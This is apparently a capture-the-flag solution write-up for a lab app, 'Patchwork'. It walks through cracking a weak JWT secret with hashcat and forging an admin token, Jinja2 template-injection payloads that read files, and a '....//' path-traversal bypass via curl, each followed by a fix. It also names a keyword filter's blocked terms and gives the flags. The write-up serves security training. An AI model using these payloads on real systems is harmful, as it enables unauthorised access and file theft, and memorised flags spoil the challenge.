# Patchwork — Solution

> ⚠️ SPOILERS BELOW — try the challenge first.

## Flag 1 — JWT Weak Secret Cracking

The app authenticates with JSON Web Tokens (JWTs) stored in a `token`
cookie. The token uses HS256 (HMAC-SHA256), meaning the signature
depends on a shared secret.

```bash
# 1. Log in as guest/guest, grab the token cookie
# It looks like: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidmlld2VyIn0.<signature>

# 2. Decode the payload (middle segment)
echo 'eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidmlld2VyIn0' | base64 -d
# → {"user":"guest","role":"viewer"}

# 3. Crack the secret with hashcat
echo '<full-token>' > token.txt
hashcat -m 16500 -a 0 token.txt /usr/share/wordlists/rockyou.txt
# → secret: "secret"

# 4. Forge a new token (Python)
import jwt
token = jwt.encode({"user": "guest", "role": "admin"}, "secret", algorithm="HS256")
# Replace the cookie in DevTools, visit /admin
```

**Flag:** `FLAG{jwt_w34k_s3cr3t_cr4ck3d}`

**Vulnerability:** The JWT signing secret is a weak dictionary word.
HS256 secrets can be brute-forced offline — the attacker has everything
they need in the token itself.

**Fix:** Use a cryptographically random secret of at least 32 bytes.
Consider RS256 (asymmetric) for higher assurance.

---

## Flag 2 — Server-Side Template Injection (SSTI)

The template preview feature renders user input through Jinja2 without
sandboxing. A keyword filter blocks `import`, `os.`, `system`,
`subprocess`, `popen`, `eval(`, `exec(`, and `breakpoint` — but not
Python's built-in `open()` function accessible through object traversal.

```
# 1. Confirm SSTI
{{7*7}}
→ 49

# 2. Read flag via Jinja2 globals — cycler is always available
{{cycler.__init__.__globals__.__builtins__.open('/flag2.txt').read()}}

# Alternative: MRO chain to find a class with access to builtins
{{().__class__.__bases__[0].__subclasses__()}}
# Find the index of a class like warnings.catch_warnings, then:
{{().__class__.__bases__[0].__subclasses__()[INDEX].__init__.__globals__['__builtins__']['open']('/flag2.txt').read()}}
```

**Flag:** `FLAG{sst1_j1nj4_0bj3ct_tr4v3rs4l}`

**Vulnerability:** Server-Side Template Injection. The Jinja2 template
engine evaluates expressions that can traverse Python's object model,
reaching built-in functions like `open()`. The keyword filter blocks
shell access but not file I/O.

**Fix:** Never render untrusted input through a template engine. For
user-customizable templates, use a sandboxed environment
(`jinja2.sandbox.SandboxedEnvironment`) or a logic-less format like
Mustache.

---

## Flag 3 — Path Traversal with Filter Bypass

The snippet download endpoint sanitizes the `file` parameter by removing
`../` — but only in a single pass using `str.replace()`:

```python
sanitized = fname.replace("../", "")
```

This is bypassable because removing `../` from `....//` leaves `../`:

```
Input:   ....//....//flag3.txt
After:   ../../flag3.txt   (the nested ../ is revealed)
Path:    /app/snippets/../../flag3.txt → /flag3.txt
```

```bash
curl -b 'token=<admin-jwt>' \
  'http://localhost:8097/api/snippets/download?file=....//....//flag3.txt'
```

**Flag:** `FLAG{p4th_tr4v3rs4l_f1lt3r_byp4ss}`

**Vulnerability:** The path traversal filter applies a single-pass
string replacement. Nested payloads survive the sanitization and
reassemble into valid traversal sequences.

**Fix:** Resolve the canonical path with `os.path.realpath()` after
joining, then verify the result starts with the allowed base directory.
Never rely on string replacement for path sanitization.
